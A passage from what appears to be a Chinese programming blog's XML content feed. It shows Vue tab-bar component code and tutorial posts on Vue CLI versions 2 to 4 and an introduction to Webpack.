class="string">&quot;item-icon&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">slot</span> <span class="attr">name</span>=<span class="string">&quot;icon&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-else</span> <span class="attr">class</span>=<span class="string">&quot;item-active-icon&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">slot</span> <span class="attr">name</span>=<span class="string">&quot;active-icon&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;item-text&quot;</span> <span class="attr">:style</span>=<span class="string">&quot;activeStyle&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">slot</span> <span class="attr">name</span>=<span class="string">&quot;text&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">name</span>: <span class="string">&quot;TabBarItem&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">props</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">link</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">type</span>: <span class="title class_">String</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">required</span>: <span class="literal">true</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">computed</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">isActive</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">$route</span>.<span class="property">path</span>.<span class="title function_">indexOf</span>(<span class="variable language_">this</span>.<span class="property">link</span>) !== -<span class="number">1</span></span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">activeStyle</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">isActive</span> ? &#123;<span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;deepPink&#x27;</span>&#125; : &#123;&#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">itemClick</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">replace</span>(<span class="variable language_">this</span>.<span class="property">link</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-id">#tab-bar-item</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="comment">/*对flex均等分*/</span></span></span><br><span class="line"><span class="language-css">  <span class="attribute">flex</span>: <span class="number">1</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">height</span>: <span class="number">49px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">font-size</span>: <span class="number">14px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.item-icon</span> <span class="selector-tag">img</span>, <span class="selector-class">.item-active-icon</span> <span class="selector-tag">img</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">width</span>: <span class="number">24px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">height</span>: <span class="number">24px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">margin-top</span>: <span class="number">3px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">vertical-align</span>: middle;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">margin-bottom</span>: <span class="number">2px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.item-text</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">font-size</span>: <span class="number">12px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">margin-top</span>: <span class="number">3px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">color</span>: <span class="number">#333</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>TabBar组件：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;tab-bar&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">name</span>: <span class="string">&quot;Tabbar&quot;</span></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-id">#tab-bar</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-color</span>: <span class="number">#f6f6f6</span>;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="attribute">position</span>: fixed;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">left</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">right</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">bottom</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="attribute">box-shadow</span>: <span class="number">0</span> -<span class="number">1px</span> <span class="number">1px</span> <span class="built_in">rgba</span>(<span class="number">100</span>, <span class="number">100</span>, <span class="number">100</span>, .<span class="number">2</span>);</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>App.vue：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">router-view</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tab-bar</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">tab-bar-item</span> <span class="attr">link</span>=<span class="string">&quot;/home&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">template</span> #<span class="attr">icon</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./assets/img/tabbar/home.svg&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">template</span> #<span class="attr">active-icon</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./assets/img/tabbar/home_active.svg&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">template</span> #<span class="attr">text</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">tab-bar-item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">tab-bar-item</span> <span class="attr">link</span>=<span class="string">&quot;/category&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">template</span> #<span class="attr">icon</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./assets/img/tabbar/category.svg&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">template</span> #<span class="attr">active-icon</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./assets/img/tabbar/category_active.svg&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">template</span> #<span class="attr">text</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span>&gt;</span>分类<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">tab-bar-item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">tab-bar-item</span> <span class="attr">link</span>=<span class="string">&quot;/cart&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">template</span> #<span class="attr">icon</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./assets/img/tabbar/shopcart.svg&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">template</span> #<span class="attr">active-icon</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./assets/img/tabbar/shopcart_active.svg&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">template</span> #<span class="attr">text</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span>&gt;</span>购物车<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">tab-bar-item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">tab-bar-item</span> <span class="attr">link</span>=<span class="string">&quot;/profile&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">template</span> #<span class="attr">icon</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./assets/img/tabbar/profile.svg&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">template</span> #<span class="attr">active-icon</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./assets/img/tabbar/profile_active.svg&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">template</span> #<span class="attr">text</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span>&gt;</span>我的<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">tab-bar-item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tab-bar</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">TabBar</span> <span class="keyword">from</span> <span class="string">&quot;./components/tabbar/TabBar&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">TabBarItem</span> <span class="keyword">from</span> <span class="string">&quot;./components/tabbar/TabBarItem&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">name</span>: <span class="string">&#x27;App&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">TabBar</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">TabBarItem</span></span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="keyword">@import</span> <span class="string">&quot;assets/css/base.less&quot;</span>;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue Router </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue CLI相关</title>
      <link href="/posts/a9f7/"/>
      <url>/posts/a9f7/</url>
      
        <content type="html"><![CDATA[<h1 id="Vue-CLI"><a href="#Vue-CLI" class="headerlink" title="Vue CLI"></a>Vue CLI</h1><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><ul><li>如果你只是简单写几个Vue的Demo程序, 那么你不需要Vue CLI。</li><li>如果你在开发大型项目, 那么你需要, 并且必然需要使用Vue CLI。<ul><li>使用Vue.js开发大型应用时，我们需要考虑代码目录结构、项目结构和部署、热加载、代码单元测试等事情。</li><li>如果每个项目都要手动完成这些工作，那无疑效率比较低效，所以通常我们会使用一些脚手架工具来帮助完成这些事情。</li></ul></li></ul><p><strong>CLI是什么意思?</strong></p><ul><li><p>CLI是Command-Line Interface, 翻译为命令行界面, 但是俗称脚手架。</p></li><li><p>Vue CLI是一个官方发布 vue.js 项目脚手架。</p></li><li><p>使用 vue-cli 可以快速搭建Vue开发环境以及对应的webpack配置。</p></li></ul><h2 id="安装脚手架"><a href="#安装脚手架" class="headerlink" title="安装脚手架"></a>安装脚手架</h2><blockquote><p>使用前提：安装Node和Webpack</p></blockquote><ul><li><p>关于旧版本</p><p>Vue CLI 的包名称由 <code>vue-cli</code> 改成了 <code>@vue/cli</code>。 如果你已经全局安装了旧版本的 <code>vue-cli</code> (1.x 或 2.x)，你需要先通过 <code>npm uninstall vue-cli -g</code> 或 <code>yarn global remove vue-cli</code> 卸载它。如果卸载不了旧版本，像我使用npm卸载2.9.6版本太久甚至没反应，可以使用cnpm卸载，具体命令参考<a href="https://nanzx.top/posts/a5d2/">我的webpack详解中的2.1</a>。</p></li><li><p>Node 版本要求</p><p>Vue CLI 4.x 需要 <a href="https://nodejs.org/">Node.js</a> v8.9 或更高版本 (推荐 v10 以上)。</p></li><li><p>可以使用下列任一命令安装这个新的包</p><p><code>npm install -g @vue/cli</code> 或 <code>yarn global add @vue/cli</code></p></li><li><p>可以用这个命令来检查其版本是否正确：</p><p><code>vue --version</code></p></li></ul><h1 id="Vue-CLI2"><a href="#Vue-CLI2" class="headerlink" title="Vue CLI2"></a>Vue CLI2</h1><h2 id="创建旧版本的2-x模板"><a href="#创建旧版本的2-x模板" class="headerlink" title="创建旧版本的2.x模板"></a>创建旧版本的2.x模板</h2><p>上面安装的是Vue CLI 4.x的版本，如果需要想按照Vue CLI2的方式初始化项目时不可以的。<img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201107212311.png"></p><ul><li>Vue CLI2创建项目命令：<br><code>vue init webpack my-project</code></li><li>Vue CLI&gt;&#x3D;3创建项目命令：<br><code>vue create my-project</code></li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201107212603.png"></p><h2 id="目录结构详解"><a href="#目录结构详解" class="headerlink" title="目录结构详解"></a>目录结构详解</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201107213239.png"></p><h2 id="Vue程序运行过程"><a href="#Vue程序运行过程" class="headerlink" title="Vue程序运行过程"></a>Vue程序运行过程</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201108030136.png"></p><h2 id="Runtime-Compiler和Runtime-only的区别"><a href="#Runtime-Compiler和Runtime-only的区别" class="headerlink" title="Runtime-Compiler和Runtime-only的区别"></a>Runtime-Compiler和Runtime-only的区别</h2><p>在使用 vue-cli 脚手架构建项目时，会遇到一个构建选项 Vue build，有两个选项：Runtime + Compiler和Runtime-only：</p><ul><li><p><strong>Runtime + Compiler: recommended for most users</strong></p><blockquote><p>运行程序+编译器:推荐给大多数用户</p></blockquote></li><li><p><strong>Runtime-only: about 6KB lighter min+gzip, but templates (or any Vue-specificHTML) are ONLY allowed in .vue files - render functions are required elsewhere</strong></p><blockquote><p>仅运行程序: 比上面那种模式轻大约 6KB min+gzip，但是 template (或任何特定于vue的html)只允许在.vue文件中使用——其他地方用需要 render 函数</p></blockquote></li></ul><hr><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201108032301.png"></p><p>两种模式生成的区别只有在 main.js 中，其他都是一样的：</p><ul><li>Runtime + Compiler中是使用 template + component</li><li>Runtime-only则是使用 render 函数</li></ul><hr><p><strong>Runtime + Compiler 中 Vue 的运行过程:</strong></p><p>(1)首先将vue中的模板解析成abstract syntax tree （ast）抽象语法树</p><p>(2)将抽象语法树再编译成render函数</p><p>(3)将render函数再转换成virtual dom，也就是虚拟dom</p><p>(4)最后将虚拟dom显示在浏览器上</p><p><strong>而 Runtime-only 只需2步：</strong></p><p>(1)将render函数再转换成virtual dom，也就是虚拟dom</p><p>(2)最后将虚拟dom显示在浏览器上</p><p><strong>简单总结：</strong></p><ul><li><p>Runtime-only 比 Runtime-Compiler 轻 6kb，因为少了编译器</p></li><li><p>Runtime-only 运行更快，因为它少了编译的环节</p></li><li><p>Runtime-only 只能识别render函数，不能渲染template，<code>.vue</code>文件中的template也是被 <code>vue-template-compiler</code> 编译成了render函数</p></li><li><p>如果在之后的开发中，你依然使用template，就需要选择Runtime-Compiler</p></li><li><p>如果你之后的开发中，使用的是.vue文件夹开发，那么可以选择Runtime-only</p></li></ul><h2 id="render函数的使用"><a href="#render函数的使用" class="headerlink" title="render函数的使用"></a>render函数的使用</h2><p><strong>类型</strong>：<code>(createElement: () =&gt; VNode) =&gt; VNode</code></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215027.png"></p><p>Vue 选项中的 <code>render</code> 函数若存在，则 Vue 构造函数不会从 <code>template</code> 选项或通过 <code>el</code> 选项指定的挂载元素中提取出的 HTML 模板编译渲染函数。</p><h2 id="npm-run-build"><a href="#npm-run-build" class="headerlink" title="npm run build"></a>npm run build</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201108233918.png"></p><h2 id="npm-run-dev"><a href="#npm-run-dev" class="headerlink" title="npm run dev"></a>npm run dev</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201108233949.png"></p><h2 id="修改配置：webpack-base-conf-js起别名"><a href="#修改配置：webpack-base-conf-js起别名" class="headerlink" title="修改配置：webpack.base.conf.js起别名"></a>修改配置：webpack.base.conf.js起别名</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201108234123.png"></p><p>这样起别名后，在引用文件的路径上可以用别名代替，例如：</p><ul><li><p>.src&#x2F;components&#x2F;tabbar&#x2F;TabBar可变为 ~components&#x2F;tabbar&#x2F;TabBar，以后移动代码或文件时，就不会因为忘记修改引用路径而报错。</p></li><li><p><code>~</code>只有js不用加，html和css要加。</p></li></ul><h1 id="Vue-CLI3"><a href="#Vue-CLI3" class="headerlink" title="Vue CLI3"></a>Vue CLI3</h1><p>vue-cli 3 与 2 版本有很大区别：</p><ul><li>vue-cli 3 是基于 webpack 4 打造，vue-cli 2 还是 webapck 3</li><li>vue-cli 3 的设计原则是“0配置”，移除的配置文件根目录下的，build和config等目录</li><li>vue-cli 3 提供了 vue ui 命令，提供了可视化配置，更加人性化</li><li>移除了static文件夹，新增了public文件夹，并且index.html移动到public中</li></ul><h2 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h2><p>创建项目命令：<br>    <code>vue create my-project</code></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201108234604.png"></p><h2 id="目录结构详解-1"><a href="#目录结构详解-1" class="headerlink" title="目录结构详解"></a>目录结构详解</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201108234638.png"></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><ul><li>通过图形化界面进行vue的配置和管理，启动配置服务器的命令：<code>vue ui</code></li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201109012242.png"></p><ul><li>可以看到目录结构与2的相比少了配置目录，也就是没了build和config，配置文件都到了@vue模块里：</li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215028.png"></p><ul><li>可以自定义vue.config.js</li></ul><h2 id="自定义配置：起别名"><a href="#自定义配置：起别名" class="headerlink" title="自定义配置：起别名"></a>自定义配置：起别名</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201109012627.png"></p><h1 id="Vue-CLI4"><a href="#Vue-CLI4" class="headerlink" title="Vue CLI4"></a>Vue CLI4</h1><p>2020年11月9日01:27:38，目前我安装脚手架的最新版本为：4.5.8，与3.x的差异不大。</p>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue CLI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Webpack详解</title>
      <link href="/posts/a5d2/"/>
      <url>/posts/a5d2/</url>
      
        <content type="html"><![CDATA[<h1 id="认识Webpack"><a href="#认识Webpack" class="headerlink" title="认识Webpack"></a>认识Webpack</h1><blockquote><p>Webpack 是一个前端资源加载&#x2F;打包工具。它将根据模块的依赖关系进行静态分析，然后将这些<strong>模块</strong>按照指定的规则<strong>打包</strong>生成对应的静态资源。</p></blockquote><h2 id="概念解释"><a href="#概念解释" class="headerlink" title="概念解释"></a>概念解释</h2><p><strong>模块化：</strong><a href="https://nanzx.top/posts/e220/">https://nanzx.top/posts/e220/</a></p><p>在ES6之前，我们要想进行模块化开发，就必须借助于其他的工具让我们可以进行模块化开发。并且在通过模块化开发完成了项目后，还需要处理模块间的各种依赖，将其进行整合打包。</p><p>而webpack其中一个核心就是让我们可以进行模块化开发，并且会帮助我们处理模块间的依赖关系。<br>而且不仅仅是JavaScript文件，我们的CSS、图片、json文件等等在webpack中都可以被当做模块来使用，这就是webpack中模块化的概念。</p><p><strong>打包：</strong></p><p>就是将webpack中的各种资源模块进行打包合并成一个或多个包(Bundle)。<br>并且在打包的过程中，还可以对资源进行处理，比如压缩图片，将scss转成css，将ES6语法转成ES5语法，将TypeScript转成JavaScript等等操作。</p><h2 id="和grunt-gulp的对比"><a href="#和grunt-gulp的对比" class="headerlink" title="和grunt&#x2F;gulp的对比"></a>和grunt&#x2F;gulp的对比</h2><p>grunt&#x2F;gulp的核心是<strong>Task</strong>:</p><ul><li>我们可以配置一系列的task，并且定义task要处理的事务（例如ES6、ts转化，图片压缩，scss转成css）</li><li>之后让grunt&#x2F;gulp来依次执行这些task，而且让整个流程自动化。</li><li>所以grunt&#x2F;gulp也被称为<strong>前端自动化任务管理工具</strong>。</li></ul><p>我们来看一个gulp的task，这个task就是将src下面的所有js文件转成ES5的语法，并且最终输出到dist文件夹中。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201104185928.png"></p><p>什么时候用grunt&#x2F;gulp呢？</p><blockquote><p>如果工程模块依赖非常简单，甚至是没有用到模块化的概念。只需要进行简单的合并、压缩，就使用grunt&#x2F;gulp即可。但是如果整个项目使用了模块化管理，而且相互依赖非常强，我们就可以使用更加强大的webpack了。</p></blockquote><p>grunt&#x2F;gulp和webpack有什么不同呢？</p><blockquote><p>grunt&#x2F;gulp更加强调的是前端流程的自动化，模块化不是它的核心。<br>webpack更加强调模块化开发管理，而文件压缩合并、预处理等功能，是它附带的功能。</p></blockquote><h1 id="webpack起步"><a href="#webpack起步" class="headerlink" title="webpack起步"></a>webpack起步</h1><h2 id="webpack安装"><a href="#webpack安装" class="headerlink" 